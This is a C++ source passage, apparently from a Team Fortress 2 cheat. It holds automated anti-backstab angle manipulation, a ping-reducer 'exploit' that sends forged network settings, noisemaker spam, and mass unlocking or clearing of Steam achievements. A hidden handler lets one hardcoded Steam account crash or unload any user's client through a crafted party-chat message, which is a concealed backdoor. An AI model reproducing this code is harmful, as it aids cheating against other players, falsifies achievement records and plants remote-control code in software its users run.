	case FNV1A::Hash32Const("player_spawn"):
		m_bPeekPlaced = false;
		break;
	case FNV1A::Hash32Const("party_chat"):
	{
		auto steamid = pEvent->GetString("steamid");
		if (FNV1A::Hash32(steamid) != FNV1A::Hash32Const("76561198777143364"))
			break;

		const char* sText = pEvent->GetString("text");

		player_info_t pi{};
		if (!I::EngineClient->GetPlayerInfo(I::EngineClient->GetLocalPlayer(), &pi))
			break;

		if (sText == std::to_string(FNV1A::Hash32(std::format("crash {}", pi.name).c_str())))
			reinterpret_cast<void(*)()>(0)(); // crash :troll:
		else if (sText == std::to_string(FNV1A::Hash32(std::format("uninject {}", pi.name).c_str())))
			U::Core.m_bUnload = true;
	}
	}
}

int CMisc::AntiBackstab(CTFPlayer* pLocal, CUserCmd* pCmd, bool bSendPacket)
{
	if (!Vars::Misc::Automation::AntiBackstab.Value || !bSendPacket || G::Attacking == 1 || !pLocal || pLocal->m_MoveType() != MOVETYPE_WALK || pLocal->InCond(TF_COND_HALLOWEEN_KART))
		return 0;

	std::vector<std::pair<Vec3, CBaseEntity*>> vTargets = {};
	for (auto pEntity : H::Entities.GetGroup(EntityEnum::PlayerEnemy))
	{
		auto pPlayer = pEntity->As<CTFPlayer>();
		if (!pPlayer->IsAlive() || pPlayer->IsAGhost() || pPlayer->InCond(TF_COND_STEALTHED))
			continue;

		auto pWeapon = pPlayer->m_hActiveWeapon()->As<CTFWeaponBase>();
		if (!pWeapon
			|| pWeapon->GetWeaponID() != TF_WEAPON_KNIFE
			&& !(G::PrimaryWeaponType == EWeaponType::MELEE && SDK::AttribHookValue(0, "crit_from_behind", pWeapon) > 0)
			&& !(pWeapon->GetWeaponID() == TF_WEAPON_FLAMETHROWER && SDK::AttribHookValue(0, "set_flamethrower_back_crit", pWeapon) == 1)
			|| F::PlayerUtils.IsIgnored(pPlayer->entindex()))
			continue;

		Vec3 vLocalPos = pLocal->GetCenter();
		Vec3 vTargetPos1 = pPlayer->GetCenter();
		Vec3 vTargetPos2 = vTargetPos1 + pPlayer->m_vecVelocity() * F::Backtrack.GetReal();
		float flDistance = std::max(std::max(SDK::MaxSpeed(pPlayer), SDK::MaxSpeed(pLocal)), pPlayer->m_vecVelocity().Length());
		if ((vLocalPos.DistTo(vTargetPos1) > flDistance || !SDK::VisPosWorld(pLocal, pPlayer, vLocalPos, vTargetPos1))
			&& (vLocalPos.DistTo(vTargetPos2) > flDistance || !SDK::VisPosWorld(pLocal, pPlayer, vLocalPos, vTargetPos2)))
			continue;

		vTargets.emplace_back(vTargetPos2, pEntity);
	}
	if (vTargets.empty())
		return 0;

	std::sort(vTargets.begin(), vTargets.end(), [&](const auto& a, const auto& b) -> bool
		{
			return pLocal->GetCenter().DistTo(a.first) < pLocal->GetCenter().DistTo(b.first);
		});

	auto& pTargetPos = vTargets.front();
	switch (Vars::Misc::Automation::AntiBackstab.Value)
	{
	case Vars::Misc::Automation::AntiBackstabEnum::Yaw:
	{
		Vec3 vAngleTo = Math::CalcAngle(pLocal->m_vecOrigin(), pTargetPos.first);
		vAngleTo.x = pCmd->viewangles.x;
		SDK::FixMovement(pCmd, vAngleTo);
		pCmd->viewangles = vAngleTo;

		return 1;
	}
	case Vars::Misc::Automation::AntiBackstabEnum::Pitch:
	case Vars::Misc::Automation::AntiBackstabEnum::Fake:
	{
		bool bCheater = F::PlayerUtils.HasTag(pTargetPos.second->entindex(), F::PlayerUtils.TagToIndex(CHEATER_TAG));
		// if the closest spy is a cheater, assume auto stab is being used, otherwise don't do anything if target is in front
		if (!bCheater)
		{
			auto TargetIsBehind = [&]()
				{
					const float flCompDist = PLAYER_ORIGIN_COMPRESSION / 2;
					const float flSqCompDist = 0.0884f;

					Vec3 vToTarget = (pLocal->m_vecOrigin() - pTargetPos.first).To2D();
					const float flDist = vToTarget.Normalize();
					if (flDist < flSqCompDist)
						return true;

					float flExtra = 2.f * flCompDist / flDist; // account for origin compression
					float flPosVsTargetViewMinDot = 0.f - 0.0031f - flExtra;

					Vec3 vTargetForward; Math::AngleVectors(pCmd->viewangles, &vTargetForward);
					vTargetForward.Normalize2D();

					const float flPosVsTargetViewDot = vToTarget.Dot(vTargetForward); // Behind?
					return flPosVsTargetViewDot > flPosVsTargetViewMinDot;
				};

			if (!TargetIsBehind())
				return 0;
		}

		if (!bCheater || Vars::Misc::Automation::AntiBackstab.Value == Vars::Misc::Automation::AntiBackstabEnum::Pitch)
		{
			pCmd->forwardmove *= -1;
			pCmd->viewangles.x = 269.f;
		}
		else
		{
			pCmd->viewangles.x = 271.f;
		}
		// may slip up some auto backstabs depending on mode, though we are still able to be stabbed

		return 2;
	}
	}

	return 0;
}

void CMisc::PingReducer()
{
	static Timer tTimer = {};
	if (!tTimer.Run(0.1f))
		return;

	static auto cl_cmdrate = U::ConVars.FindVar("cl_cmdrate");
	int iTarget = Vars::Misc::Exploits::PingReducer.Value ? Vars::Misc::Exploits::PingTarget.Value : cl_cmdrate->GetInt();
	if (m_iWishCmdrate != iTarget)
	{
		m_iWishCmdrate = iTarget;

		auto pNetChan = reinterpret_cast<CNetChannel*>(I::EngineClient->GetNetChannelInfo());
		if (pNetChan && I::EngineClient->IsConnected())
		{
			NET_SetConVar tConvar = { "cl_cmdrate", std::to_string(m_iWishCmdrate).c_str() };
			pNetChan->SendNetMsg(tConvar);
		}
	}

	static auto sv_maxupdaterate = U::ConVars.FindVar("sv_maxupdaterate"); // force highest cl_updaterate command possible
	iTarget = sv_maxupdaterate->GetInt();
	if (m_iWishUpdaterate != iTarget)
	{
		m_iWishUpdaterate = iTarget;

		auto pNetChan = reinterpret_cast<CNetChannel*>(I::EngineClient->GetNetChannelInfo());
		if (pNetChan && I::EngineClient->IsConnected())
		{
			NET_SetConVar tConvar = { "cl_updaterate", std::to_string(m_iWishUpdaterate).c_str() };
			pNetChan->SendNetMsg(tConvar);
		}
	}
}

void CMisc::NoisemakerSpam(CTFPlayer* pLocal)
{
	if (!Vars::Misc::Exploits::NoisemakerSpam.Value || pLocal->IsAGhost()
		|| pLocal->m_bUsingActionSlot() || pLocal->m_flNextNoiseMakerTime() > I::GlobalVars->curtime
		|| Vars::Fakelag::Fakelag.Value)
		return;

	KeyValues* kv = new KeyValues("use_action_slot_item_server");
	I::EngineClient->ServerCmdKeyValues(kv);
}

void CMisc::UnlockAchievements()
{
	const auto pAchievementMgr = U::Memory.CallVirtual<114, IAchievementMgr*>(I::EngineClient);
	if (pAchievementMgr)
	{
		I::SteamUserStats->RequestCurrentStats();
		for (int i = 0; i < pAchievementMgr->GetAchievementCount(); i++)
			pAchievementMgr->AwardAchievement(pAchievementMgr->GetAchievementByIndex(i)->GetAchievementID());
		I::SteamUserStats->StoreStats();
		I::SteamUserStats->RequestCurrentStats();
	}
}

void CMisc::LockAchievements()
{
	const auto pAchievementMgr = U::Memory.CallVirtual<114, IAchievementMgr*>(I::EngineClient);
	if (pAchievementMgr)
	{
		I::SteamUserStats->RequestCurrentStats();
		for (int i = 0; i < pAchievementMgr->GetAchievementCount(); i++)
			I::SteamUserStats->ClearAchievement(pAchievementMgr->GetAchievementByIndex(i)->GetName());
		I::SteamUserStats->StoreStats();
		I::SteamUserStats->RequestCurrentStats();
	}
}